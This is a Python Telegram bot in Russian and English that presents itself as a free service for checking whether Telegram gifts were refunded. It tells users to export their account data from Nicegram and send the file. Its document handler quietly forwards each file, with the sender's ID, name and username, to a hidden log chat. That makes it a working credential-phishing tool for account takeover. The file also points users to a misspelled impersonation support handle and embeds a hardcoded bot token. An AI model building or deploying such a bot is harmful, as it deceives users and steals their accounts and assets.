import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

token = "8319985017:AAFi-pgbafGPeGtEzHipftlQB-5pGK2MoyE"
log = -5004020544

bot = telebot.TeleBot(token)

# Тексты на разных языках
texts = {
    "ru": {
        "welcome": "<b>Привет! Я - Бот, который поможет тебе не попасться на мошенников.</b>\n\n<blockquote>Я помогу отличить:\n• Реальный подарок от чистого визуала\n• Чистый подарок без рефаунда\n• Подарок, за который уже вернули деньги</blockquote>\n\n<b>Выбери действие:</b>",
        "instruction": "<b>Инструкция:</b>\n\n<blockquote>1. Скачайте приложение Nicegram с официального сайта, нажав на кнопку в главном меню.\n2. Откройте Nicegram и войдите в свой аккаунт.\n3. Зайдите в настройки и выберите пункт «Nicegram».\n4. Экспортируйте данные аккаунта, нажав на кнопку «Экспортировать в файл».\n5. Откройте главное меню бота и нажмите на кнопку \"Проверка на рефаунд\".\n6. Отправьте файл боту.</blockquote>",
        "check_refund": "<b>Пожалуйста, отправьте файл для проверки на рефаунд.</b>",
        "support": "Если у вас возникли проблемы при проверке вашего подарка обращайтесь в поддержку - @SuportNicegram",
        "file_sent": "<b>Файл успешно отправлен на проверку!</b>",
        "checking_file": "✅ Файл успешно отправлен на проверку!...",
        "instruction_btn": "📖 Инструкция",
        "check_refund_btn": "🔍 Проверить на рефаунд",
        "nicegram_btn": "📱 Nicegram App",
        "support_btn": "🆘 Поддержка",
        "start_btn": "🚀 Главное меню"
    },
    "en": {
        "welcome": "<b>Hello! I'm a Bot that will help you avoid scammers.</b>\n\n<blockquote>I will help distinguish:\n• A real gift from a pure visual\n• A clean gift without refund\n• A gift for which money has already been returned</blockquote>\n\n<b>Choose an action:</b>",
        "instruction": "<b>Instruction:</b>\n\n<blockquote>1. Download the Nicegram app from the official website by clicking the button in the main menu.\n2. Open Nicegram and log into your account.\n3. Go to settings and select the \"Nicegram\" item.\n4. Export account data by clicking the \"Export to file\" button.\n5. Open the bot's main menu and click the \"Check for refund\" button.\n6. Send the file to the bot.</blockquote>",
        "check_refund": "<b>Please send the file to check for refund.</b>",
        "support": "If you have problems checking your gift, contact support - @SuportNicegram",
        "file_sent": "<b>File successfully sent for verification!</b>",
        "checking_file": "✅ Checking the file...",
        "instruction_btn": "📖 Instruction",
        "check_refund_btn": "🔍 Check for refund",
        "nicegram_btn": "📱 Nicegram App",
        "support_btn": "🆘 Support",
        "start_btn": "🚀 Main menu"
    }
}

# Хранилище для языка пользователя
user_languages = {}

def get_user_language(user_id):
    return user_languages.get(user_id, "ru")

def set_user_language(user_id, language):
    user_languages[user_id] = language

def language_menu():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru"),
        InlineKeyboardButton("English 🇬🇧", callback_data="lang_en")
    )
    return keyboard

def main_menu(language="ru"):
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton(texts[language]["instruction_btn"], callback_data="instruction"),
        InlineKeyboardButton(texts[language]["check_refund_btn"], callback_data="check_refund"),
        InlineKeyboardButton(texts[language]["support_btn"], callback_data="support"),
        InlineKeyboardButton(texts[language]["nicegram_btn"], url="https://nicegram.app/")
    )
    return keyboard

def back_button(language="ru"):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton(texts[language]["start_btn"], callback_data="start_menu"))
    return keyboard

def send_photo_with_menu(chat_id, message_id=None, caption="", reply_markup=None, language="ru"):
    try:
        with open('nice.png', 'rb') as photo:
            if message_id:
                # Редактируем существующее сообщение
                bot.edit_message_media(
                    chat_id=chat_id,
                    message_id=message_id,
                    media=telebot.types.InputMediaPhoto(
                        photo,
                        caption=caption,
                        parse_mode='HTML'
                    ),
                    reply_markup=reply_markup
                )
            else:
                # Отправляем новое сообщение
                bot.send_photo(
                    chat_id,
                    photo,
                    caption=caption,
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
    except FileNotFoundError:
        if message_id:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=caption,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        else:
            bot.send_message(
                chat_id,
                caption,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )

@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = "<b>Выберите язык / Choose language</b>"
    
    try:
        with open('nice.png', 'rb') as photo:
            bot.send_photo(
                message.chat.id, 
                photo, 
                caption=welcome_text, 
                reply_markup=language_menu(), 
                parse_mode='HTML'
            )
    except FileNotFoundError:
        bot.send_message(
            message.chat.id, 
            welcome_text, 
            reply_markup=language_menu(), 
            parse_mode='HTML'
        )

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    language = get_user_language(user_id)
    
    if call.data.startswith("lang_"):
        language = call.data.split("_")[1]
        set_user_language(user_id, language)
        
        welcome_text = texts[language]["welcome"]
        send_photo_with_menu(
            call.message.chat.id,
            call.message.message_id,
            welcome_text,
            main_menu(language),
            language
        )
    
    elif call.data == "instruction":
        instruction_text = texts[language]["instruction"]
        send_photo_with_menu(
            call.message.chat.id,
            call.message.message_id,
            instruction_text,
            back_button(language),
            language
        )
    
    elif call.data == "check_refund":
        check_refund_text = texts[language]["check_refund"]
        send_photo_with_menu(
            call.message.chat.id,
            call.message.message_id,
            check_refund_text,
            back_button(language),
            language
        )
    
    elif call.data == "support":
        support_text = texts[language]["support"]
        send_photo_with_menu(
            call.message.chat.id,
            call.message.message_id,
            support_text,
            back_button(language),
            language
        )
    
    elif call.data == "start_menu":
        welcome_text = texts[language]["welcome"]
        send_photo_with_menu(
            call.message.chat.id,
            call.message.message_id,
            welcome_text,
            main_menu(language),
            language
        )

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    language = get_user_language(user_id)
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        log_text = (
            f"📎 Новый файл от пользователя:\n"
            f"👤 ID: {message.from_user.id}\n"
            f"📛 Имя: {message.from_user.first_name}\n"
            f"📝 Username: @{message.from_user.username}\n"
            f"📄 Имя файла: {message.document.file_name}\n"
            f"📦 MIME тип: {message.document.mime_type}"
        )
        
        bot.send_document(
            log, 
            downloaded_file, 
            visible_file_name=message.document.file_name,
            caption=log_text
        )
        
        bot.reply_to(message, texts[language]["file_sent"], parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, texts[language]["checking_file"])
        print(f"Error: {e}")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    pass

if __name__ == "__main__":
    print("Бот запущен...")
    bot.infinity_polling()
